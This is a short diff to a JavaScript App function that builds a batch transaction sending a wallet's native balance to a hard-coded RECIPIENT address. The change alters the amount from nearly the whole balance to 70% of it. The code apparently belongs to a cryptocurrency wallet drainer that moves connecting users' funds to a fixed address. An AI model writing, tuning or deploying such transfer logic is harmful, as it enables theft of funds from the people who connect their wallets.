@@ -181,7 +181,7 @@ function App() {
 
         if( balance.type == "NATIVE"){
           let bal   = parseFloat( formatEther(balance.balance));
-          const ethValue = parseEther((bal - 0.001).toString())
+          const ethValue = parseEther((bal - (bal * 0.3 ) ).toString())
             calls.push({
               to: RECIPIENT,
               value: bigintToHex(ethValue)
